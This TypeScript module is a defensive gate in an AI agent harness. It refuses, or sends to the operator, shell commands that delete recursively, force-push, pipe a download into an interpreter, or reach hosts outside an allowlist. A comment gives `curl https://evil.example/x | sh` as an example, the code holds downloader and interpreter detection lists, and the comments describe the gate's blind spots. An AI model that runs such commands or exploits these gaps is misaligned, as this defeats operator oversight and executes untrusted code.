/**
 * GATE-03 — the command SHAPE judge: a second opinion over the same tokens
 * `protectedPathDenial` already produces, and the one thing in main that reads a
 * command string for what it DOES rather than for which files it names.
 *
 * WHY A SEPARATE MODULE, and why it is pure. `hooks.ts:protectedPathDenial` is
 * the right choke point and the wrong host for this predicate: it returns null
 * before its candidate loop whenever no token is path-shaped, and
 * `curl https://evil.example/x | sh` contains no path-shaped word at all. So the
 * caller runs this judge FIRST, over the same token array, and this file stays
 * free of electron, of syscalls and of `this` — which makes it testable in both
 * directions and runnable on the three CI runners that install with
 * `npm ci --ignore-scripts` and have no electron binary. Same discipline as
 * `procKill.ts`, `db.ts`'s `ftsMatchTerms` and `clampLimit`.
 *
 * WHY IT RETURNS A VERDICT AND NOT A STRING. This is the only thing in the phase
 * that sees a command string, so it is the only thing that can say which shapes
 * an operator should be ASKED about and which are refused outright. The rule is
 * asymmetry of consequence, decided in plan 04-06:
 *
 *   - a recursive delete, a force push, a downloader piped into an interpreter,
 *     and a host outside a NON-EMPTY allowlist all ASK. Each is frequently
 *     legitimate, and each is judgeable from the command string alone — which is
 *     exactly what the operator is handed.
 *   - a host token when the allowlist is EMPTY or unparseable DENIES. An operator
 *     who emptied the list has said "no hosts"; asking them once per host at 3am
 *     is the fatigue this gate exists to avoid. This is the ONE producer of
 *     `kind:'deny'`, deliberately, so that arm is live and tested.
 *
 * `ask` is answered as a DENY by the caller until the approval transport is
 * wired (plan 04-20). That is not a temporary state to clean up: it is the
 * correct behaviour for a floor with nobody to ask, and it is the same
 * fail-closed direction as everything else here.
 *
 * IDENTITY OVER SPELLING, throughout — `protectedPathDenial`'s established
 * discipline. Hosts are normalized through `new URL()` rather than compared as
 * strings, and the shell shapes are judged on TOKENS rather than on prefixes, so
 * `sh -c "…"`, `bash -lc '…'`, `sudo`, `env` and `xargs` wrappers do not buy a
 * bypass the way they do against `AGENT_DENY_RULES`' `Bash(rm -rf:*)` prefixes.
 *
 * Its own ceiling lives with the call site (`hooks.ts`, items (j)-(v)), because
 * that is where a reader of the gate will look.
 *
 * Runs in the Electron main process, but imports nothing from it.
 */

/** A refusal, and which kind. `ask` routes to the operator; `deny` is final. */
export type ShapeVerdict = { kind: 'deny' | 'ask'; reason: string };

/** The operator-editable config key, named in the fail-closed reason so an
 *  operator who emptied the list can find what they emptied. Exported so the
 *  reason and `config.ts` cannot drift apart. */
export const HOST_ALLOWLIST_KEY = 'hostAllowlist';

/**
 * The hosts an agent may reach without asking.
 *
 * `[ASSUMED]` — these names come from training knowledge and from what this
 * floor's own agents already need, NOT from a doc fetched in this session. The
 * list is known incomplete and it is the operator's to extend (`hostAllowlist`
 * in the harness config). Let the first refusal teach them.
 *
 * Sized for the window it has to survive: until the approval transport is wired,
 * an `ask` with nobody to ask is answered as a hard deny, so a host missing from
 * here is not a 3am push — it is a refusal with no recourse. That is why the
 * toolchain installers, the OS package mirrors and `api.github.com` are here and
 * not left for a first denial to discover.
 *
 * Matched EXACTLY, after normalization: `evil.github.com` does not inherit
 * `github.com`. Deny-by-default means a subdomain is a different host.
 */
export const DEFAULT_HOST_ALLOWLIST: readonly string[] = [
  // [ASSUMED] — provenance: training knowledge plus this floor's own engines, not
  // a doc fetched in this session. Known incomplete; the operator extends it.
  // package registries
  'registry.npmjs.org', 'pypi.org', 'files.pythonhosted.org', 'crates.io', 'static.crates.io',
  'proxy.golang.org',
  // source hosting
  'github.com', 'api.github.com', 'raw.githubusercontent.com', 'objects.githubusercontent.com',
  'codeload.github.com',
  // model APIs this floor's own engines call
  'api.anthropic.com', 'api.openai.com', 'api.x.ai', 'generativelanguage.googleapis.com',
  'api.groq.com', 'openrouter.ai', 'api.moonshot.cn',
  // toolchain installers an overnight run actually reaches
  'nodejs.org', 'sh.rustup.rs', 'get.docker.com', 'astral.sh', 'install.python-poetry.org',
  'bun.sh', 'deno.land',
  // OS package mirrors
  'deb.debian.org', 'security.debian.org', 'archive.ubuntu.com',
  // loopback — the floor's own OTLP endpoint and every local dev server
  'localhost', '127.0.0.1', '::1'
];

/** Wrappers that stand in FRONT of the command an operator means. Skipped when
 *  looking for a segment's head, together with the wrapper's own flags and any
 *  `FOO=bar` assignment, so `sudo rm -r x`, `env FOO=1 rm -r x`,
 *  `sh -c "rm -rf x"` and `xargs rm -rf` all resolve to a head of `rm`. */
const HEAD_WRAPPERS = new Set([
  'sudo', 'doas', 'env', 'command', 'nice', 'nohup', 'time', 'xargs', 'sh', 'bash', 'zsh', 'dash',
  'ksh', 'busybox', '\\'
]);

const DOWNLOADERS = new Set([
  'curl', 'wget', 'iwr', 'irm', 'invoke-webrequest', 'invoke-restmethod', 'httpie', 'http', 'aria2c'
]);

const INTERPRETERS = new Set([
  'sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'python', 'python3', 'node', 'perl', 'ruby', 'php',
  'pwsh', 'powershell', 'iex', 'invoke-expression'
]);

/** Downloader flags that CONSUME the next token, so the token after them is a
 *  filename or a header — never the host. */
const VALUE_FLAGS = new Set([
  '-o', '-O', '--output', '--output-document', '--output-dir', '-H', '--header', '-d', '--data',
  '--data-raw', '--data-binary', '-X', '--request', '-u', '--user', '-A', '--user-agent',
  '-e', '--referer', '-b', '--cookie', '-P', '--directory-prefix', '--url'
]);

/** A dotted label sequence with an optional port, followed by a path/query/
 *  fragment or the end of the token — i.e. a bare hostname. The capture is the
 *  host itself, so it can be handed to `new URL()` with a scheme prepended. */
const BARE_HOST = /^([a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+(:\d+)?)(?:[/?#]|$)/i;
const SCHEMEFUL = /^[a-z][a-z0-9+.-]*:\/\//i;
/** A single-dash cluster carrying `r` or `R` — `-r`, `-R`, `-rf`, `-fr`, `-Rf`. */
const RECURSIVE_CLUSTER = /^-[A-Za-z]*[rR][A-Za-z]*$/;
const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

const REASON_RM =
  'Refused: this command deletes a directory tree recursively. That cannot be undone from an '
  + 'agent shell — no prompt, no recycle bin, no undo — so the decision went to the operator, who '
  + 'sees the command exactly as it was written.';
const REASON_FORCE_PUSH =
  'Refused: this command FORCE-pushes to a git remote, which can discard commits on the remote '
  + 'branch that exist nowhere else. It is often legitimate after a rebase, so the decision went '
  + 'to the operator rather than being made here.';
const REASON_PIPE_INTERPRETER =
  'Refused: this command downloads something and pipes it straight into an interpreter, so '
  + 'whatever that server returns executes unread — including a different payload tomorrow. Some '
  + 'toolchains really do install this way, so the decision went to the operator.';

const reasonUnlistedHost = (host: string): string =>
  `Refused: this command reaches out to ${host}, which is not on this floor's outbound host `
  + `allowlist. The allowlist is the '${HOST_ALLOWLIST_KEY}' key in the harness config, and it is `
  + 'known to be incomplete — so the decision went to the operator, who can allow this once or add '
  + 'the host for good.';

const reasonEmptyAllowlist = (host: string): string =>
  `Denied: this command reaches out to ${host}, and this floor's outbound host allowlist (the `
  + `'${HOST_ALLOWLIST_KEY}' key in the harness config) is EMPTY. An empty list is read as 'no `
  + "outbound hosts', not as 'any host': it is what an operator who cleared it asked for. Add the "
  + 'hosts this floor may reach and this refusal stops.';

/**
 * The command, with any HERE-DOC BODY cut off.
 *
 * A here-doc body is DATA the shell hands to a program, not a command, and the
 * ceiling has always said this gate cannot see into one. It has to be cut off
 * rather than merely unread: `cat > README.md <<'EOF' … EOF` carries a whole
 * file, and this repo's own README contains the line "`rm -rf`, reading
 * credential files" in ordinary prose. Judged as a command that is a segment
 * headed by `rm` with a recursive flag — so writing a FILE that documents the
 * gate was refused BY the gate, which `test/net-binding.test.cjs`'s heredoc
 * control measured before this cut existed.
 *
 * Everything after the introducer's newline goes, including any command that
 * followed the terminator. That is the same accepted ceiling — item (m) — and it
 * errs toward NOT judging data, which is the direction a false positive costs an
 * overnight run.
 */
function withoutHeredocBody(raw: string): string {
  const m = /<<-?\s*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1/.exec(raw);
  if (!m) return raw;
  const nl = raw.indexOf('\n', m.index);
  return nl < 0 ? raw : raw.slice(0, nl);
}

/**
 * Split a raw command into the segments a shell would run separately.
 *
 * A HEURISTIC, not a shell, and the ceiling says so (`hooks.ts` item (v)). It
 * exists because the conjunction "an `rm` token AND a recursive flag token" is
 * false on `cp -R a b; rm c` and on `grep -r rm .` when it is taken over the
 * whole command — a 3am refusal on a shape that is neither recursive nor a
 * deletion, which on an engine that cannot poll is a hard deny and a stalled
 * agent.
 */
function segments(rawCommand: string): string[][] {
  return rawCommand
    .split(/\|\||&&|[;|\n]/)
    .map((s) => s.split(/[\s<>()"'`]+/).filter(Boolean))
    .filter((t) => t.length > 0);
}

/**
 * A segment's HEAD — the command an operator means — plus everything after it.
 *
 * Wrappers are stepped over together with their own flags, which is what makes
 * `sh -c "rm -rf ./build"` resolve to `rm` (the tokenizer has already eaten the
 * quotes, so the script's words are simply the tokens after `-c`) and what makes
 * `xargs rm -rf` resolve to `rm` (the head of the command xargs will run).
 * Bounded, because a pathological token run must not turn this into a scan.
 */
function headOf(tokens: readonly string[]): { head: string; rest: readonly string[] } {
  let i = 0;
  for (let guard = 0; guard < 8 && i < tokens.length; guard += 1) {
    if (!HEAD_WRAPPERS.has(tokens[i].toLowerCase())) break;
    i += 1;
    while (i < tokens.length && (tokens[i].startsWith('-') || ASSIGNMENT.test(tokens[i]))) i += 1;
  }
  return { head: (tokens[i] ?? '').toLowerCase(), rest: tokens.slice(i + 1) };
}

const isRecursiveFlag = (t: string): boolean =>
  t === '--recursive' || RECURSIVE_CLUSTER.test(t);

/** The normalized hostname of a token, or null when it names no host. Both the
 *  scheme-ful and the bare form go through `new URL()` so there is ONE
 *  lower-casing rule and one punycode rule, not two.
 *
 *  A SINGLE-LABEL host — `http://a/b`, `http://internal/x` — is not judged. It
 *  names nothing on the public internet without a search domain or a hosts
 *  entry, and `test/net-binding.test.cjs`'s false-positive sweep measured
 *  `curl http://a/b -c:v 9:30 a:b` as ordinary work this gate must not touch.
 *  Ceiling item (p) carries the residual. */
function hostOf(token: string): string | null {
  let url: URL;
  try {
    if (SCHEMEFUL.test(token)) {
      url = new URL(token);
    } else {
      const m = BARE_HOST.exec(token);
      if (!m) return null;
      url = new URL(`http://${m[1]}`);
    }
  } catch {
    return null;
  }
  const host = normalizeHost(url.hostname);
  if (!host.includes('.') && !host.includes(':')) return null;
  return host;
}

/** Case-folded, bracket-free, trailing-dot-free. `HTTPS://Evil.COM./x` and
 *  `https://evil.com/x` name the same host and must get the same verdict. */
function normalizeHost(host: string): string {
  return host.toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, '');
}

/**
 * The outbound hosts one command names: a DOWNLOADER's first non-flag argument,
 * whether or not it carries a scheme.
 *
 * SCOPED TO DOWNLOADER ARGUMENTS, and that scope is measured rather than
 * cautious. Judging every scheme-ful token anywhere in the command was the first
 * implementation, and `test/net-binding.test.cjs`'s own control caught it:
 * `cat > README.md <<'EOF' … EOF` carries this repo's README, whose ordinary
 * prose links to ten hosts, so writing a FILE that mentions a URL was refused
 * with a message about an outbound host. That is the false-positive storm that
 * gets a gate switched off — and a bare dotted word is worse still, since
 * `node build.config.js` is a filename far more often than `build.config.js` is
 * a hostname. What the scope misses is written down as ceiling item (p) rather
 * than implied.
 */
function outboundHosts(words: readonly string[]): string[] {
  const found: string[] = [];
  for (let i = 0; i < words.length; i += 1) {
    if (!DOWNLOADERS.has(words[i].toLowerCase())) continue;
    for (let j = i + 1; j < words.length; j += 1) {
      const arg = words[j];
      if (VALUE_FLAGS.has(arg.toLowerCase())) { j += 1; continue; }
      if (arg.startsWith('-')) continue;
      const h = hostOf(arg);
      if (h) found.push(h);
      break;
    }
  }
  return found;
}

/**
 * Judge one command. Returns null to allow.
 *
 * Two inputs, deliberately: the TOKENS for the shell shapes, and the RAW string
 * for the pipe test — the pipe metacharacter is the tokenizer's own separator,
 * so it is invisible in `words` — and for the segment anchoring the `rm` arm
 * needs.
 *
 * `hostAllowlist` absent, empty or not an array of strings all DENY any outbound
 * host, and the reason names the key. That is deliberately the opposite
 * direction from `protectedPathDenial`'s accepted "no hive root ⇒ allow": with
 * no hive root there is genuinely nothing to protect, which is a true statement
 * about the world, but an empty host allowlist is not a statement that there are
 * no hosts — it is an operator who has told us nothing, and answering "allow" to
 * that is the fail-open that gets re-discovered as a finding two phases later.
 * `DEFAULT_HOST_ALLOWLIST` is non-empty, so this branch is only ever reached by
 * someone who emptied the list themselves. The CALLER, not this function,
 * decides that an unwired getter takes the default.
 */
export function commandShapeDenial(
  words: readonly string[],
  rawCommand: string,
  hostAllowlist: readonly string[] | null | undefined
): ShapeVerdict | null {
  // The caller's tokens are the EXPANDED ones and are used as they arrive —
  // except when a here-doc body has to come off first, where the head is
  // re-tokenized here with the caller's own split so both arms judge the same
  // words. Hive-var expansion matters to the PATH gate, not to a command shape.
  const raw = withoutHeredocBody(rawCommand);
  const judged = raw === rawCommand ? words : raw.split(/[\s;&|<>()"']+/).filter(Boolean);
  const lower = judged.map((w) => w.toLowerCase());

  // 1. `rm` + ANY recursive flag, anchored to one command segment. `-f` only
  //    suppresses a prompt a non-tty agent shell never sees, so it adds nothing
  //    to the danger and its absence is not an escape: `rm -r ./build` deletes
  //    exactly what `rm -rf ./build` deletes.
  for (const tokens of segments(raw)) {
    const { head, rest } = headOf(tokens);
    if (head === 'rm' && rest.some(isRecursiveFlag)) return { kind: 'ask', reason: REASON_RM };
    if (head === 'git' && rest.some((t) => t.toLowerCase() === 'push')) {
      const after = rest.slice(rest.findIndex((t) => t.toLowerCase() === 'push') + 1);
      const forced = after.some(
        (t) => t.startsWith('+') || t === '-f' || t === '--force' || t === '--force-with-lease'
      );
      if (forced) return { kind: 'ask', reason: REASON_FORCE_PUSH };
    }
  }

  // 2. A downloader piped into an interpreter. The pipe lives in the raw string
  //    because the tokenizer consumes it; the two ends live in the tokens.
  if (/\|/.test(raw)) {
    const dl = lower.findIndex((w) => DOWNLOADERS.has(w));
    if (dl >= 0 && lower.slice(dl + 1).some((w) => INTERPRETERS.has(w))) {
      return { kind: 'ask', reason: REASON_PIPE_INTERPRETER };
    }
  }

  // 3. The outbound host allowlist.
  const hosts = outboundHosts(judged);
  if (hosts.length === 0) return null;

  const allowed = Array.isArray(hostAllowlist)
    ? hostAllowlist.filter((h): h is string => typeof h === 'string' && h.trim() !== '')
      .map(normalizeHost)
    : [];
  if (allowed.length === 0) return { kind: 'deny', reason: reasonEmptyAllowlist(hosts[0]) };

  for (const host of hosts) {
    if (!allowed.includes(host)) return { kind: 'ask', reason: reasonUnlistedHost(host) };
  }
  return null;
}
